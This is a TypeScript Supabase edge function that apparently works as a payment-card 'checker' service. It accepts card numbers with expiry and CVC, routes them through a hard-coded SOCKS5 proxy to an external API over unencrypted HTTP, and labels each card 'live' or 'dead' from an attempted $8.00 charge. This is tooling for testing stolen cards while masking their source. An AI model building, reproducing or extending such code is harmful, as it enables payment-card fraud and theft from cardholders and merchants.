import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;

// API Configuration
const API_BASE_URL = "http://web-production-7ad4f.up.railway.app/api";
const PROXY_IP = "138.197.124.55";
const PROXY_PORT = "9150";
const PROXY_TYPE = "sock5";

// Fast API call with 30s timeout
const callApi = async (cc: string): Promise<{ status: string; message: string; rawResponse: string }> => {
  const apiUrl = `${API_BASE_URL}?cc=${encodeURIComponent(cc)}&proxy=${PROXY_IP}:${PROXY_PORT}&proxytype=${PROXY_TYPE}`;
  
  console.log(`[STRIPE-CHARGE] API call started`);
  
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 30000); // 30s timeout for speed
  
  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: { 'Accept': '*/*' },
      signal: controller.signal,
    });
    
    clearTimeout(timeoutId);
    const rawText = await response.text();
    console.log(`[STRIPE-CHARGE] Response: ${rawText.substring(0, 100)}`);
    
    let apiStatus = 'unknown';
    let apiMessage = rawText;
    
    try {
      const json = JSON.parse(rawText);
      apiMessage = json.message || json.msg || rawText;
      
      // Quick status detection
      if (json.full_response === true) {
        apiStatus = 'live';
      } else if (json.full_response === false) {
        apiStatus = 'dead';
      } else {
        const lower = apiMessage.toLowerCase();
        if (lower.includes('success') || lower.includes('charged')) apiStatus = 'live';
        else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || lower.includes('insufficient')) apiStatus = 'dead';
      }
    } catch {
      const lower = rawText.toLowerCase();
      if (lower.includes('charged') || lower.includes('success')) apiStatus = 'live';
      else if (lower.includes('declined') || lower.includes('invalid')) apiStatus = 'dead';
    }
    
    return { status: apiStatus, message: apiMessage, rawResponse: rawText };
    
  } catch (error) {
    clearTimeout(timeoutId);
    const errMsg = error instanceof Error ? error.message : 'Failed';
    const isTimeout = errMsg.includes('abort');
    return { status: 'unknown', message: isTimeout ? 'Timeout' : errMsg, rawResponse: errMsg };
  }
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Parse body first (faster than waiting for auth)
    const body = await req.json();
    const { cc } = body;
    
    if (!cc) {
      return new Response(JSON.stringify({ error: 'Card required', computedStatus: 'unknown' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Quick format validation
    const parts = cc.split('|');
    if (parts.length < 4 || !parts[3] || parts[3].length < 3 || !/^\d+$/.test(parts[3])) {
      return new Response(JSON.stringify({ error: "Format: CardNumber|MM|YY|CVC", computedStatus: 'unknown' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Start API call immediately while auth happens
    const apiPromise = callApi(cc);

    // Auth check in parallel
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Invalid token" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Ban check
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(JSON.stringify({ error: "Account suspended" }), 
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Wait for API result
    const result = await apiPromise;
    
    return new Response(
      JSON.stringify({
        computedStatus: result.status,
        apiStatus: result.status === 'live' ? 'CHARGED' : result.status === 'dead' ? 'DECLINED' : 'UNKNOWN',
        apiMessage: result.message,
        apiTotal: '$8.00',
        status: result.status,
        message: result.message,
      }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    const msg = error instanceof Error ? error.message : 'Error';
    return new Response(JSON.stringify({ error: msg, computedStatus: "unknown" }), 
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }
});
